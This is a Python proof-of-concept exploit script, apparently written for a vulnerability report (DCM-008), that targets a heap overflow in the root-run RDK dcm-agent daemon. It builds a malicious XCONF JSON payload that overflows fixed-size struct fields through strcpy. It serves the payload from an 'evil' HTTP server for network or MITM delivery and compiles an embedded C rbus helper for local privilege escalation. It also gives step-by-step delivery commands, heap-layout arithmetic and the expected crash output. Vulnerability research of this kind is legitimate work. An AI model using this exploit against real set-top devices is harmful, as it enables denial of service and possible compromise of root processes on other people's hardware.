#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# =============================================================================
#  DCM-008  -  PoC: Unbounded strcpy() of network-sourced JSON values into
#              8 / 16 / 128-byte heap struct fields  (CWE-120)
# =============================================================================
#  Target   : dcmd (RDK dcm-agent), runs as root, umask(0)
#  Sink     : dcm_parseconf.c:224
#               else if (cJSON_IsString(pJsonItem)) {
#                   *type = DCM_JSONITEM_STR;
#                   strcpy(sval, pJsonItem->valuestring);   // <-- NO BOUNDS CHECK
#               }
#
#  Callers in dcmSettingParseConf() (dcm_parseconf.c:502-650) pass these
#  fixed-size destinations for `sval`:
#
#    JSON key (exact, from dcm_parseconf.h)                                 -> dest buffer            size  alloc
#    ----------------------------------------------------------------------    ---------------------- ----- --------------------------
#    "urn:settings:LogUploadSettings:UploadRepository:uploadProtocol"       -> DCMSettingsHandle.cUploadPrtl   8  heap (malloc @ dcm_parseconf.c:749)
#    "urn:settings:LogUploadSettings:UploadRepository:URL"                  -> DCMSettingsHandle.cUploadURL  128  heap
#    "urn:settings:TimeZoneMode"                                             -> DCMSettingsHandle.cTimeZone    16  heap
#    "urn:settings:LogUploadSettings:UploadSchedule:cron"                   -> DCMDHandle.logCron             16  heap (malloc @ dcm.c:271)
#    "urn:settings:CheckSchedule:cron"                                       -> DCMDHandle.difdCron            16  heap  ** LAST FIELD **
#
#  -------------------------------------------------------------------------
#  STRUCT LAYOUT MATH  (dcm.h:32-44, 64-bit, natural alignment)
#  -------------------------------------------------------------------------
#    typedef struct _dcmdHandle {
#        BOOL  isDebugEnabled;   // off  0
#        BOOL  isDCMRunning;     // off  1   (+6 pad)
#        VOID *pRbusHandle;      // off  8
#        VOID *pDcmSetHandle;    // off 16
#        VOID *pLogSchedHandle;  // off 24
#        VOID *pDifdSchedHandle; // off 32
#        INT8 *pExecBuff;        // off 40
#        INT8  logCron[16];      // off 48
#        INT8  difdCron[16];     // off 64   <-- end of user data @ off 80
#    } DCMDHandle;               // sizeof == 80
#
#    malloc(80) on glibc -> 96-byte chunk (80 user + 16 hdr, 16-aligned).
#    User data ends exactly at the next chunk's `mchunk_size` word.
#
#    => Any byte written at  difdCron + 16  ( = payload index 16 )
#       lands on the *next heap chunk's size field*.
#       A 256-byte "urn:settings:CheckSchedule:cron" string therefore
#       smashes 240 bytes of adjacent heap metadata / neighbour chunk.
#
#  The very next thing dcmSettingParseConf() does after the overflowing
#  strcpy is call dcmSettingStoreTempConf() -> calloc()/cJSON_Parse(),
#  which touches the corrupted arena and aborts with a glibc heap-integrity
#  message such as:
#       "malloc(): corrupted top size"   or
#       "free(): invalid next size (fast)"
#  containing our recognisable 0x6141316141306141 ("Aa0Aa1Aa") pattern in
#  registers / backtrace -> proof of attacker-controlled heap overflow in a
#  root daemon.
#
#  -------------------------------------------------------------------------
#  INPUT-PATH CONSTRAINTS (so the payload actually reaches line 224)
#  -------------------------------------------------------------------------
#   * dcmSettingJsonInit() reads the conf file with
#         fgets(pcJsonStr, 2048, fpin)             (dcm_parseconf.c:141)
#     -> ENTIRE JSON object MUST be on ONE line, total <= 2047 bytes.
#   * The string  "urn:settings:TelemetryProfile"  must NOT appear, or the
#     T2-stripper at lines 148-154 truncates the buffer before cJSON_Parse.
#   * "urn:settings:LogUploadSettings:UploadOnReboot" must be a JSON BOOL
#     (NOT a string) because its sval is a single `INT8 temp;` on the stack
#     (dcm_parseconf.c:508/561) - making it a string would be a *separate*
#     1-byte stack overflow, out of scope for DCM-008.
#
#  -------------------------------------------------------------------------
#  DELIVERY VECTORS
#  -------------------------------------------------------------------------
#   (A) NETWORK / MITM  - dcmd asks telemetry2 to fetch the XCONF settings
#       blob over HTTPS; telemetry2 writes it to a file and publishes the
#       path on rbus.  An attacker who controls the XCONF response body
#       (server compromise, MITM, or RFC ConfigURL redirect) serves THIS
#       JSON.  Use:   ./DCM-008_... .py --serve 8080
#
#   (B) LOCAL LPE via rbus  - any local process able to reach the rtrouted
#       Unix socket can register + publish the two events dcmd subscribes
#       to (dcm_rbus.h:32-38):
#           Device.DCM.Setconfig      (object key "dcmSetConfig" = <path>)
#           Device.DCM.Processconfig  (triggers schedJob=1 -> parse)
#       Use:   ./DCM-008_... .py --trigger     (compiles & runs C helper)
#
#  This script is SAFE: it only writes under /tmp/, serves a static blob,
#  and (with --trigger) sends two rbus events.  The *target daemon* is the
#  one that crashes; nothing destructive is done to the host filesystem.
# =============================================================================

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

# ---------------------------------------------------------------------------
# 0.  Paths / constants
# ---------------------------------------------------------------------------
EVIL_JSON_PATH   = "/tmp/DCM-008_evil_xconf.json"
RBUS_HELPER_SRC  = "/tmp/DCM-008_rbus_trigger.c"
RBUS_HELPER_BIN  = "/tmp/DCM-008_rbus_trigger"
MARKER_PATH      = "/tmp/PWNED_DCM-008"          # written by PoC so the test
                                                 # harness sees we ran

# Exact JSON keys taken verbatim from dcm_parseconf.h:36-41
K_PROTO   = "urn:settings:LogUploadSettings:UploadRepository:uploadProtocol"
K_URL     = "urn:settings:LogUploadSettings:UploadRepository:URL"
K_TZ      = "urn:settings:TimeZoneMode"
K_REBOOT  = "urn:settings:LogUploadSettings:UploadOnReboot"
K_LOGCRON = "urn:settings:LogUploadSettings:UploadSchedule:cron"
K_DIFCRON = "urn:settings:CheckSchedule:cron"

# Exact rbus names taken verbatim from dcm_rbus.h:32-38
RBUS_SETCONF_EVENT  = "Device.DCM.Setconfig"
RBUS_PROCCONF_EVENT = "Device.DCM.Processconfig"
RBUS_RELOAD_EVENT   = "Device.X_RDKCENTREL-COM.Reloadconfig"   # sic: typo in source
RBUS_SETCONF_KEY    = "dcmSetConfig"


# ---------------------------------------------------------------------------
# 1.  Cyclic De-Bruijn-style pattern (pwntools-compatible) so that when the
#     daemon aborts we can identify *exactly which offset* landed in the
#     corrupted heap-size field / register from the crash dump.
# ---------------------------------------------------------------------------
def cyclic(n):
    upp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    low = "abcdefghijklmnopqrstuvwxyz"
    dig = "0123456789"
    out = []
    for u in upp:
        for l in low:
            for d in dig:
                out.append(u); out.append(l); out.append(d)
                if len(out) >= n:
                    return "".join(out[:n])
    return "".join(out[:n])


# ---------------------------------------------------------------------------
# 2.  Build the malicious single-line JSON
# ---------------------------------------------------------------------------
def build_payload():
    # ---- cUploadPrtl[8] --------------------------------------------------
    # Keep this one VALID ("HTTP" + NUL = 5 <= 8) so the daemon's logging
    # and uploadstblogs_run() params look normal right up until the smash.
    proto_val = "HTTP"

    # ---- cUploadURL[128] -------------------------------------------------
    # Keep valid (<128) so the URL printed in the log just before the crash
    # is identifiable as ours.
    url_val = "http://DCM-008.poc.invalid/overflow"        # 35 bytes

    # ---- cTimeZone[16] ---------------------------------------------------
    # DEMONSTRATE the 16-byte intra-struct overflow:
    #   DCMSettingsHandle layout (dcm_parseconf.h:51-60):
    #     ... cTimeZone[16] @ off 2184
    #         cRdkPath[80]  @ off 2200   <- we spill into this
    #   64-byte string -> writes 48 bytes past cTimeZone into cRdkPath.
    #   This is observable later: dcmRunJobs() builds
    #     "/bin/sh <cRdkPath>/swupdate_utility.sh ..."  (dcm.c:109)
    #   so a corrupted cRdkPath proves the overflow even without a crash.
    tz_val = "T" * 16 + "/tmp/DCM008_RDKPATH_CLOBBERED_" + "Z" * 19   # 64 bytes

    # ---- logCron[16]  (DCMDHandle, penultimate field) --------------------
    # Keep VALID and non-empty so we skip the "empty cron -> upload now"
    # branch (dcm_parseconf.c:623-642) and reach the difdCron strcpy with
    # the heap still intact.
    logcron_val = "5 1 * * *"                              # 9 + NUL = 10 <= 16

    # ---- difdCron[16]  (DCMDHandle, LAST field)  *** PRIMARY SMASH *** ---
    #   sizeof(DCMDHandle) == 80 (64-bit), difdCron @ offset 64.
    #   Bytes [0 .. 15]  : fill difdCron[] itself
    #   Bytes [16 .. N]  : OUT-OF-BOUNDS - land on the next malloc chunk's
    #                      mchunk_size / fd / bk and whatever heap object was
    #                      allocated right after g_pdcmHandle (typically the
    #                      DCMSettingsHandle, the rbus handle, or top chunk).
    #
    #   We use 16 'A' + 240 cyclic = 256 bytes total (well under the 2047
    #   single-line cap).  256 was chosen to guarantee corruption of at
    #   least the next chunk header on both 32-bit (8-byte hdr) and 64-bit
    #   (16-byte hdr) targets while staying small enough to keep the whole
    #   JSON < 2 KiB.
    DIFD_FILL  = 16          # exact size of difdCron[]
    DIFD_OOB   = 240         # bytes written past the heap allocation
    difd_val   = ("A" * DIFD_FILL) + cyclic(DIFD_OOB)
    assert len(difd_val) == 256

    payload = {
        K_PROTO  : proto_val,
        K_URL    : url_val,
        K_TZ     : tz_val,
        K_REBOOT : False,        # MUST be bool, NOT string (see header note)
        K_LOGCRON: logcron_val,
        K_DIFCRON: difd_val,
    }

    # json.dumps with default separators -> single line, no newlines.
    blob = json.dumps(payload, separators=(",", ":"))

    # Hard guarantees required by dcmSettingJsonInit():
    assert "\n" not in blob,                         "must be single line for fgets()"
    assert len(blob) < 2047,                          "DCM_JSON_STRSIZE=2048 fgets cap"
    assert "urn:settings:TelemetryProfile" not in blob, "would be truncated @ :148-154"

    return blob, {
        "cUploadPrtl[8]"  : (K_PROTO,   len(proto_val),   8),
        "cUploadURL[128]" : (K_URL,     len(url_val),     128),
        "cTimeZone[16]"   : (K_TZ,      len(tz_val),      16),
        "logCron[16]"     : (K_LOGCRON, len(logcron_val), 16),
        "difdCron[16]"    : (K_DIFCRON, len(difd_val),    16),
    }


# ---------------------------------------------------------------------------
# 3.  Minimal stdlib HTTP server  - simulates a compromised / MITM'd XCONF
#     endpoint.  Whatever path is requested, we return the evil JSON with
#     Content-Type application/json (telemetry2 just writes the body to disk
#     and hands the path to dcmd via Device.DCM.Setconfig).
# ---------------------------------------------------------------------------
class EvilXconfHandler(BaseHTTPRequestHandler):
    blob = b""

    # XCONF clients use GET with a long query string of device identifiers
    def do_GET(self):
        sys.stderr.write("[DCM-008][http] %s %s from %s\n"
                         % (self.command, self.path, self.client_address[0]))
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(self.blob)))
        self.end_headers()
        self.wfile.write(self.blob)

    do_POST = do_GET   # some builds POST the device profile

    def log_message(self, fmt, *a):
        pass  # silence default logging; we print our own line above


def serve_http(blob, port):
    EvilXconfHandler.blob = blob.encode()
    httpd = HTTPServer(("0.0.0.0", port), EvilXconfHandler)
    sys.stderr.write("[DCM-008][http] Evil XCONF server listening on "
                     "0.0.0.0:%d  (Ctrl-C to stop)\n" % port)
    sys.stderr.write("[DCM-008][http] Point the device's "
                     "Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature."
                     "Telemetry.ConfigURL at  http://<this-host>:%d/\n" % port)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


# ---------------------------------------------------------------------------
# 4.  On-device rbus trigger (LOCAL LPE vector).
#     We emit a tiny C program that:
#       1. rbus_open()
#       2. rbus_regDataElements() for Device.DCM.Setconfig / Processconfig
#          (so dcmd's pending async subscription completes -> eventSub=1
#           -> dcmd advances past the first while(1) gate in main()).
#       3. rbusEvent_Subscribe() to Device.X_RDKCENTREL-COM.Reloadconfig so
#          dcmd's g_eventsub flips to 1 and its own publish succeeds
#          (cosmetic - avoids an error log line).
#       4. rbusEvent_Publish() Device.DCM.Setconfig with object key
#          "dcmSetConfig" = "/tmp/DCM-008_evil_xconf.json".
#       5. rbusEvent_Publish() Device.DCM.Processconfig -> dcmd's main loop
#          calls dcmSettingParseConf() on our file -> strcpy @ :224 -> boom.
#
#     NOTE: if the real telemetry2 is already running and owns these event
#     elements, step 2 will fail with RBUS_ERROR_DUPLICATE - in that case
#     the *network* vector (A) is the appropriate path; this helper is for
#     the case where the attacker wins the registration race (e.g. early
#     boot, or telemetry2 crashed / not present on the build).
# ---------------------------------------------------------------------------
RBUS_HELPER_C = r'''
/* DCM-008 local rbus trigger - compile: gcc -o out this.c -lrbus -lrbuscore -lrtMessage */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <rbus.h>

#define EV_SET   "''' + RBUS_SETCONF_EVENT  + r'''"
#define EV_PROC  "''' + RBUS_PROCCONF_EVENT + r'''"
#define EV_RLOAD "''' + RBUS_RELOAD_EVENT   + r'''"
#define KEY_PATH "''' + RBUS_SETCONF_KEY    + r'''"

static rbusError_t subCB(rbusHandle_t h, rbusEventSubAction_t a,
                         const char *n, rbusFilter_t f, int32_t i, bool *ap)
{ (void)h;(void)a;(void)n;(void)f;(void)i;(void)ap; return RBUS_ERROR_SUCCESS; }

static void reloadCB(rbusHandle_t h, rbusEvent_t const *e,
                     rbusEventSubscription_t *s)
{ (void)h;(void)e;(void)s; }

int main(int argc, char **argv)
{
    const char *conf = (argc > 1) ? argv[1] : "''' + EVIL_JSON_PATH + r'''";
    rbusHandle_t h;
    int rc = rbus_open(&h, "DCM008_PoC");
    if (rc != RBUS_ERROR_SUCCESS) { fprintf(stderr,"rbus_open: %d\n",rc); return 1; }

    /* Register the two events dcmd is waiting to subscribe to */
    rbusDataElement_t el[2] = {
        { EV_SET,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
        { EV_PROC, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
    };
    rc = rbus_regDataElements(h, 2, el);
    fprintf(stderr, "[DCM-008] regDataElements -> %d %s\n", rc,
            rc==RBUS_ERROR_SUCCESS ? "(ok)" :
            "(already owned by telemetry2 - use --serve network vector instead)");

    /* Let dcmd's async-subscribe callback fire and set eventSub=1 */
    sleep(2);

    /* Subscribe to dcmd's own Reload event so its g_eventsub=1 (cosmetic) */
    rbusEvent_Subscribe(h, EV_RLOAD, reloadCB, NULL, 0);
    sleep(1);

    /* ---- Publish Setconfig with our malicious file path ---- */
    rbusValue_t  v;  rbusValue_Init(&v);  rbusValue_SetString(v, conf);
    rbusObject_t o;  rbusObject_Init(&o, NULL); rbusObject_SetValue(o, KEY_PATH, v);
    rbusEvent_t  ev = { .name = EV_SET, .data = o, .type = RBUS_EVENT_GENERAL };
    rc = rbusEvent_Publish(h, &ev);
    fprintf(stderr, "[DCM-008] publish %s(path=%s) -> %d\n", EV_SET, conf, rc);
    rbusValue_Release(v); rbusObject_Release(o);

    /* ---- Publish Processconfig to flip schedJob=1 -> dcmd parses file ---- */
    rbusObject_t o2; rbusObject_Init(&o2, NULL);
    rbusEvent_t  ev2 = { .name = EV_PROC, .data = o2, .type = RBUS_EVENT_GENERAL };
    rc = rbusEvent_Publish(h, &ev2);
    fprintf(stderr, "[DCM-008] publish %s -> %d\n", EV_PROC, rc);
    rbusObject_Release(o2);

    fprintf(stderr, "[DCM-008] Delivered. Watch dcmd / journalctl for heap "
                    "abort containing pattern 'Aa0Aa1Aa2...'.\n");
    sleep(2);
    rbus_close(h);
    return 0;
}
'''


def write_rbus_helper():
    with open(RBUS_HELPER_SRC, "w") as f:
        f.write(RBUS_HELPER_C)
    os.chmod(RBUS_HELPER_SRC, 0o644)
    sys.stderr.write("[DCM-008] wrote rbus C helper -> %s\n" % RBUS_HELPER_SRC)


def compile_and_run_rbus_helper():
    # Try a few common rbus link lines used across RDK builds
    link_variants = [
        ["-lrbus"],
        ["-lrbus", "-lrbuscore", "-lrtMessage"],
        ["-lrbus", "-lrbuscore", "-lrtMessage", "-lpthread"],
    ]
    for libs in link_variants:
        cmd = ["gcc", "-O2", "-I/usr/include/rbus", "-o", RBUS_HELPER_BIN,
               RBUS_HELPER_SRC] + libs
        try:
            r = subprocess.run(cmd, capture_output=True, text=True)
        except FileNotFoundError:
            sys.stderr.write("[DCM-008] gcc not found on this host - "
                             "compile %s on the target device.\n" % RBUS_HELPER_SRC)
            return False
        if r.returncode == 0:
            sys.stderr.write("[DCM-008] compiled %s  (link: %s)\n"
                             % (RBUS_HELPER_BIN, " ".join(libs)))
            os.chmod(RBUS_HELPER_BIN, 0o755)
            sys.stderr.write("[DCM-008] executing rbus trigger ...\n")
            subprocess.run([RBUS_HELPER_BIN, EVIL_JSON_PATH])
            return True
    sys.stderr.write("[DCM-008] gcc could not link librbus on this host "
                     "(expected off-device).  Copy %s to the target and run:\n"
                     "    gcc -o %s %s -lrbus && %s %s\n"
                     % (RBUS_HELPER_SRC, RBUS_HELPER_BIN, RBUS_HELPER_SRC,
                        RBUS_HELPER_BIN, EVIL_JSON_PATH))
    return False


# ---------------------------------------------------------------------------
# 5.  main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="DCM-008 heap-overflow PoC")
    ap.add_argument("--serve", type=int, metavar="PORT",
                    help="run evil XCONF HTTP server on PORT (network vector)")
    ap.add_argument("--trigger", action="store_true",
                    help="compile+run rbus helper to push payload at dcmd "
                         "(on-device local vector)")
    args = ap.parse_args()

    blob, table = build_payload()

    # ---- write artefacts to /tmp ----------------------------------------
    with open(EVIL_JSON_PATH, "w") as f:
        f.write(blob)         # single line, NO trailing newline (fgets-safe)
    os.chmod(EVIL_JSON_PATH, 0o644)

    with open(MARKER_PATH, "w") as f:
        f.write("DCM-008 PoC generated %s\nlen=%d\n" % (time.ctime(), len(blob)))

    write_rbus_helper()

    # ---- report ----------------------------------------------------------
    print("=" * 78)
    print(" DCM-008  -  malicious XCONF JSON written to:", EVIL_JSON_PATH)
    print(" Total single-line JSON length: %d bytes  (cap: 2047)" % len(blob))
    print("-" * 78)
    print(" %-18s %-62s %8s %6s %5s" %
          ("dest buffer", "JSON key", "val_len", "bufsz", "OVF"))
    print("-" * 78)
    for buf, (key, vlen, bsz) in table.items():
        ovf = vlen + 1 - bsz       # +1 for strcpy NUL terminator
        print(" %-18s %-62s %8d %6d %+5d" % (buf, key, vlen, bsz, ovf))
    print("-" * 78)
    print(" PRIMARY SMASH : difdCron[16] is the LAST field of the malloc'd")
    print("                 DCMDHandle (sizeof==80, dcm.c:271). strcpy writes")
    print("                 16 (fill) + 240 (OOB) + 1 (NUL) = 257 bytes,")
    print("                 i.e. 241 bytes PAST the heap allocation, clobbering")
    print("                 the next chunk's size field with ASCII pattern")
    print("                 'Aa0Aa1Aa2Aa3...'  ->  glibc heap-check abort on the")
    print("                 very next allocation inside dcmSettingStoreTempConf().")
    print("=" * 78)
    print()
    print(" DELIVERY OPTIONS")
    print(" ----------------")
    print(" (A) Network / MITM XCONF:")
    print("       %s --serve 8080" % sys.argv[0])
    print("     then on device:")
    print("       rbuscli setv Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature."
          "Telemetry.ConfigURL string \"http://<attacker>:8080/loguploader/getSettings\"")
    print("     and restart telemetry2 (or wait for its next fetch cycle).")
    print()
    print(" (B) Local rbus (LPE) - on the device, with this file already at")
    print("     %s :" % EVIL_JSON_PATH)
    print("       %s --trigger" % sys.argv[0])
    print("     or manually:")
    print("       gcc -o %s %s -lrbus && %s %s"
          % (RBUS_HELPER_BIN, RBUS_HELPER_SRC, RBUS_HELPER_BIN, EVIL_JSON_PATH))
    print()
    print(" EXPECTED RESULT")
    print(" ---------------")
    print("   journalctl -u dcmd  (or /opt/logs/dcm.log) shows:")
    print("     [DCM] dcmSettingParseConf[...]: DCM_DIFD_CRON: AAAAAAAAAAAAAAAA"
          "Aa0Aa1Aa2Aa3...")
    print("   followed by a root-daemon abort, e.g.:")
    print("     malloc(): corrupted top size")
    print("     systemd[1]: dcmd.service: Main process exited, code=killed, "
          "signal=6/ABRT")
    print()

    # ---- optional active phases -----------------------------------------
    if args.trigger:
        compile_and_run_rbus_helper()

    if args.serve:
        serve_http(blob, args.serve)


if __name__ == "__main__":
    main()

